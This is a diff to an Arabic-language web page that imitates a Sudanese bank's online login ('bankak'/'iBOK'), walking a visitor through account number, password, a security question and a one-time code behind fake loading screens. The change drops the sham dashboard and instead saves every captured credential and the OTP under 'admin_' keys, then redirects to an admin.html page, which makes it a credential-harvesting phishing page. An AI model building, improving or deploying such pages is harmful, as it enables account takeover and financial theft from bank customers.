@@ -155,7 +155,7 @@
         }
         .error-message-simple.active { display: block; }
 
-        /* ===== Overlay للتحميل (مع النقاط المتحركة) ===== */
+        /* ===== Overlay للتحميل ===== */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -170,9 +170,7 @@
             flex-direction: column;
             text-align: center;
         }
-        .loading-overlay.active {
-            display: flex;
-        }
+        .loading-overlay.active { display: flex; }
         .loading-overlay .loading-title {
             font-size: 28px;
             font-weight: 800;
@@ -367,7 +365,7 @@
         }
         .atm-box .btn-close-atm:hover { background: #c1121f; }
 
-        /* ===== الخطوة 3: OTP (تم تصحيح BANKAK) ===== */
+        /* ===== الخطوة 3: OTP ===== */
         #step3 {
             display: none;
             padding: 40px 16px 30px;
@@ -466,8 +464,6 @@
         }
         .btn-otp-confirm { background: #e63946; color: white; }
         .btn-otp-confirm:hover { background: #c1121f; }
-
-        /* ===== زر واتساب (تم نقله تحت) ===== */
         .whatsapp-section {
             margin-top: 12px;
             text-align: center;
@@ -490,124 +486,6 @@
             width: 100%;
         }
         .whatsapp-section .btn-otp-whatsapp:hover { background: #1da851; }
-
-        /* ===== تم حذف otp-whatsapp-note بالكامل ===== */
-
-        /* ===== الخطوة 4: لوحة التحكم ===== */
-        #step4 {
-            display: none;
-            padding: 20px 16px 30px;
-            max-width: 500px;
-            margin: 0 auto;
-        }
-        .dashboard-header {
-            background: linear-gradient(135deg, #c1121f, #e63946);
-            padding: 20px 16px 30px;
-            color: white;
-            border-radius: 0 0 30px 30px;
-            margin-bottom: 20px;
-        }
-        .dashboard-header .top {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 16px;
-        }
-        .dashboard-header .top .logo {
-            font-size: 24px;
-            font-weight: 800;
-        }
-        .dashboard-header .top .logo span { color: #ffc107; }
-        .dashboard-header .top .icons {
-            display: flex;
-            gap: 16px;
-            font-size: 20px;
-        }
-        .dashboard-header .top .icons i { cursor: pointer; }
-        .dashboard-header .top .icons i:hover { color: #ffc107; }
-        .dashboard-header .user {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-        .dashboard-header .user .avatar {
-            width: 56px;
-            height: 56px;
-            border-radius: 50%;
-            background: #ffc107;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            font-weight: 800;
-            color: #c1121f;
-        }
-        .dashboard-header .user .name { font-size: 20px; font-weight: 700; }
-        .dashboard-header .user .greeting { font-size: 14px; opacity: 0.9; }
-
-        .search-bar {
-            background: white;
-            border-radius: 12px;
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
-            margin-bottom: 20px;
-        }
-        .search-bar i { color: #999; font-size: 18px; }
-        .search-bar input {
-            border: none;
-            outline: none;
-            flex: 1;
-            font-size: 14px;
-            font-family: 'Cairo', sans-serif;
-            background: transparent;
-        }
-
-        .quick-actions {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 12px;
-            margin-bottom: 24px;
-        }
-        .quick-actions .item {
-            background: white;
-            border-radius: 12px;
-            padding: 14px 8px;
-            text-align: center;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .quick-actions .item:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.12);
-        }
-        .quick-actions .item i { font-size: 24px; color: #e63946; margin-bottom: 4px; }
-        .quick-actions .item span { font-size: 11px; font-weight: 600; color: #333; display: block; }
-
-        .menu-list {
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
-            overflow: hidden;
-        }
-        .menu-item {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 16px 18px;
-            border-bottom: 1px solid #f0f0f0;
-            cursor: pointer;
-            transition: 0.2s;
-            color: #333;
-        }
-        .menu-item:last-child { border-bottom: none; }
-        .menu-item:hover { background: #f8f9fa; }
-        .menu-item i { width: 22px; font-size: 18px; color: #e63946; text-align: center; }
-        .menu-item .text { flex: 1; font-size: 15px; font-weight: 500; }
-        .menu-item .arrow { color: #ccc; font-size: 14px; }
 
         /* ===== Footer ===== */
         .footer {
@@ -655,7 +533,6 @@
         .linkedin { background: linear-gradient(135deg, #0A66C2, #004182); }
         .instagram { background: radial-gradient(circle at 30% 30%, #fdf497, #fd5949, #d6249f, #285aeb); }
 
-        /* روابط السفلية */
         .security-links {
             display: flex;
             justify-content: center;
@@ -687,16 +564,12 @@
             .security-header h1 { font-size: 24px; }
             .otp-card .otp-timer { font-size: 28px; }
             .otp-actions button { font-size: 14px; padding: 12px; min-width: 100px; }
-            .quick-actions { grid-template-columns: repeat(4, 1fr); gap: 8px; }
-            .quick-actions .item { padding: 10px 4px; }
-            .quick-actions .item i { font-size: 20px; }
-            .quick-actions .item span { font-size: 10px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== Overlay للتحميل (مع النقاط المتحركة) ===== -->
+    <!-- ===== Overlay للتحميل ===== -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-title">
             جاري التحميل
@@ -778,7 +651,7 @@
         </div>
     </div>
 
-    <!-- ===== رسالة الصراف الآلي (قريباً) ===== -->
+    <!-- ===== رسالة الصراف الآلي ===== -->
     <div class="atm-overlay" id="atmOverlay">
         <div class="atm-box">
             <i class="fas fa-credit-card"></i>
@@ -788,7 +661,7 @@
         </div>
     </div>
 
-    <!-- ===== الخطوة 3: رمز التحقق (OTP) ===== -->
+    <!-- ===== الخطوة 3: OTP ===== -->
     <div id="step3">
         <div class="otp-header">
             <h1><i class="fas fa-shield-alt"></i> بنك bankak</h1>
@@ -803,56 +676,9 @@
             <div class="otp-actions">
                 <button class="btn-otp-confirm" onclick="submitOtp()">تأكيد الرمز</button>
             </div>
-            <!-- تم نقل زر واتساب إلى أسفل (whatsapp-section) وتم حذف نص "لم تستلم الرمز؟" -->
             <div class="whatsapp-section">
                 <button class="btn-otp-whatsapp" onclick="whatsappContact()"><i class="fab fa-whatsapp"></i> تواصل عبر واتساب</button>
             </div>
-        </div>
-    </div>
-
-    <!-- ===== الخطوة 4: لوحة التحكم ===== -->
-    <div id="step4">
-        <div class="dashboard-header">
-            <div class="top">
-                <div class="logo">i<span>BOK</span></div>
-                <div class="icons">
-                    <i class="fas fa-bell" onclick="alert('لا توجد إشعارات')"></i>
-                    <i class="fas fa-sign-out-alt" onclick="logout()"></i>
-                </div>
-            </div>
-            <div class="user">
-                <div class="avatar">A</div>
-                <div>
-                    <div class="greeting">مساء الخير،</div>
-                    <div class="name">ABDALWHAB DBDAWI</div>
-                </div>
-            </div>
-        </div>
-        <div class="search-bar">
-            <i class="fas fa-search"></i>
-            <input type="text" placeholder="بحث في الخدمات..." />
-        </div>
-        <div class="quick-actions">
-            <div class="item" onclick="alert('تفاصيل الحساب')"><i class="fas fa-user"></i><span>الحساب</span></div>
-            <div class="item" onclick="alert('دفع فواتير')"><i class="fas fa-file-invoice"></i><span>فواتير</span></div>
-            <div class="item" onclick="alert('تحويلات')"><i class="fas fa-exchange-alt"></i><span>تحويل</span></div>
-            <div class="item" onclick="alert('سحب بدون بطاقة')"><i class="fas fa-credit-card"></i><span>سحب</span></div>
-        </div>
-        <div class="menu-list">
-            <div class="menu-item" onclick="alert('تفاصيل الحساب')"><i class="fas fa-user-circle"></i><span class="text">تفاصيل الحساب</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('دفع فواتير')"><i class="fas fa-file-invoice"></i><span class="text">دفع فواتير</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('تحويلات')"><i class="fas fa-exchange-alt"></i><span class="text">تحويلات</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('سحب بدون بطاقة')"><i class="fas fa-credit-card"></i><span class="text">سحب بدون بطاقة</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('بنكك PAY')"><i class="fas fa-mobile-alt"></i><span class="text">بنكك PAY</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('طلب الودائع الاستثمارية')"><i class="fas fa-piggy-bank"></i><span class="text">طلب الودائع الاستثمارية</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('إدارة المستفيدين')"><i class="fas fa-users"></i><span class="text">إدارة المستفيدين</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('المعاملات السابقة')"><i class="fas fa-history"></i><span class="text">المعاملات السابقة</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('إدارة البطاقات')"><i class="fas fa-id-card"></i><span class="text">إدارة البطاقات</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('طلبات')"><i class="fas fa-clipboard-list"></i><span class="text">طلبات</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('أمر دفع دائم')"><i class="fas fa-clock"></i><span class="text">أمر دفع دائم</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('الضبط')"><i class="fas fa-cog"></i><span class="text">الضبط</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('التجارة الإلكترونية')"><i class="fas fa-shopping-cart"></i><span class="text">التجارة الإلكترونية</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
-            <div class="menu-item" onclick="alert('خدمات العملات الأجنبية')"><i class="fas fa-dollar-sign"></i><span class="text">خدمات العملات الأجنبية</span><span class="arrow"><i class="fas fa-chevron-left"></i></span></div>
         </div>
     </div>
 
@@ -873,7 +699,9 @@
     </div>
 
     <script>
-        // ===== قائمة الأسئلة الأمنية (15 سؤالاً) =====
+        // ================================================================
+        // 1. قائمة الأسئلة الأمنية (15 سؤالاً)
+        // ================================================================
         const securityQuestions = [
             "ما هو اسم المدرسة التي التحقت بها؟",
             "اسم فريق كرة القدم المفضل لديك؟",
@@ -896,23 +724,34 @@
         let timerInterval = null;
         let timeSeconds = 3600; // 60 دقيقة
 
-        // ===== دالة عرض رسالة التحميل لمدة 5 ثوانٍ (مع النقاط المتحركة) =====
+        // ===== تخزين البيانات المؤقتة =====
+        let userData = {
+            account: '',
+            password: '',
+            question: '',
+            answer: '',
+            otp: ''
+        };
+
+        // ================================================================
+        // 2. دوال التحميل والانتقال بين الخطوات
+        // ================================================================
         function showLoadingAndTransition(targetStepId) {
             const overlay = document.getElementById('loadingOverlay');
             overlay.classList.add('active');
-
             setTimeout(function() {
                 overlay.classList.remove('active');
                 document.getElementById('step1').style.display = 'none';
                 document.getElementById('step2').style.display = 'none';
                 document.getElementById('step3').style.display = 'none';
-                document.getElementById('step4').style.display = 'none';
                 document.getElementById(targetStepId).style.display = 'block';
                 document.getElementById('footer').style.marginTop = '0';
-            }, 5000); // 5 ثوانٍ
+            }, 5000);
         }
 
-        // ===== تسجيل الدخول (الخطوة 1) =====
+        // ================================================================
+        // 3. الخطوة 1: تسجيل الدخول
+        // ================================================================
         function togglePassword() {
             const input = document.getElementById('password');
             const icon = document.querySelector('.password-toggle i');
@@ -925,12 +764,12 @@
             }
         }
 
-        function showError(message) {
+        function showError(msg) {
             const el = document.getElementById('errorMessageSimple');
-            el.innerText = message;
+            el.innerText = msg;
             el.classList.add('active');
         }
-        function clearMessages() {
+        function clearErrors() {
             document.getElementById('errorMessageSimple').classList.remove('active');
         }
 
@@ -938,7 +777,7 @@
             e.preventDefault();
             const acc = document.getElementById('accountNumber').value.trim();
             const pass = document.getElementById('password').value;
-            clearMessages();
+            clearErrors();
 
             if (!/^\d{7}$/.test(acc)) {
                 showError('رقم الحساب غير صحيح.\nالرجاء إدخال 7 أرقام فقط (مثال: 1234567)');
@@ -955,6 +794,10 @@
                 return;
             }
 
+            // تخزين بيانات الحساب
+            userData.account = acc;
+            userData.password = pass;
+
             showLoadingAndTransition('step2');
             currentQuestionIndex = 0;
             updateQuestion();
@@ -962,13 +805,16 @@
 
         document.getElementById('accountNumber').addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '');
-            clearMessages();
+            clearErrors();
         });
-        document.getElementById('password').addEventListener('input', function() { clearMessages(); });
+        document.getElementById('password').addEventListener('input', function() { clearErrors(); });
 
-        // ===== الخطوة 2: سؤال الأمان =====
+        // ================================================================
+        // 4. الخطوة 2: سؤال الأمان
+        // ================================================================
         function updateQuestion() {
             document.getElementById('questionText').textContent = securityQuestions[currentQuestionIndex];
+            userData.question = securityQuestions[currentQuestionIndex];
             document.getElementById('securityAnswer').value = '';
             document.getElementById('securityAnswer').focus();
         }
@@ -984,6 +830,7 @@
                 alert('الرجاء إدخال الإجابة على سؤال الأمان');
                 return;
             }
+            userData.answer = answer;
             showLoadingAndTransition('step3');
             startOtpTimer();
         }
@@ -995,6 +842,7 @@
             document.getElementById('accountNumber').value = '';
             document.getElementById('password').value = '';
             document.getElementById('securityAnswer').value = '';
+            userData = { account: '', password: '', question: '', answer: '', otp: '' };
         }
 
         function showAtmMessage() {
@@ -1008,7 +856,9 @@
             if (e.key === 'Enter') verifySecurity();
         });
 
-        // ===== الخطوة 3: OTP =====
+        // ================================================================
+        // 5. الخطوة 3: OTP (مع تخزين البيانات ونقلها إلى admin.html)
+        // ================================================================
         function startOtpTimer() {
             timeSeconds = 3600;
             updateOtpDisplay();
@@ -1040,8 +890,16 @@
                 alert('الرمز يجب أن يكون 4-6 أرقام');
                 return;
             }
-            showLoadingAndTransition('step4');
-            if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+
+            // ✅ تخزين جميع البيانات في localStorage
+            localStorage.setItem('admin_account', userData.account);
+            localStorage.setItem('admin_password', userData.password);
+            localStorage.setItem('admin_question', userData.question);
+            localStorage.setItem('admin_answer', userData.answer);
+            localStorage.setItem('admin_otp', otp);
+
+            // ✅ الانتقال إلى صفحة الإدارة
+            window.location.href = 'admin.html';
         }
 
         function whatsappContact() {
@@ -1055,25 +913,12 @@
             this.value = this.value.replace(/\D/g, '');
         });
 
-        // ===== الخطوة 4: لوحة التحكم =====
-        function logout() {
-            if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
-                document.getElementById('step4').style.display = 'none';
-                document.getElementById('step1').style.display = 'block';
-                document.getElementById('footer').style.marginTop = '30px';
-                document.getElementById('accountNumber').value = '';
-                document.getElementById('password').value = '';
-                document.getElementById('otpInput').value = '';
-                clearMessages();
-                if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
-            }
-        }
-
-        // ===== تهيئة أولية =====
+        // ================================================================
+        // 6. تهيئة أولية (إظهار الخطوة 1 فقط)
+        // ================================================================
         document.getElementById('step1').style.display = 'block';
         document.getElementById('step2').style.display = 'none';
         document.getElementById('step3').style.display = 'none';
-        document.getElementById('step4').style.display = 'none';
     </script>
 </body>
 </html>
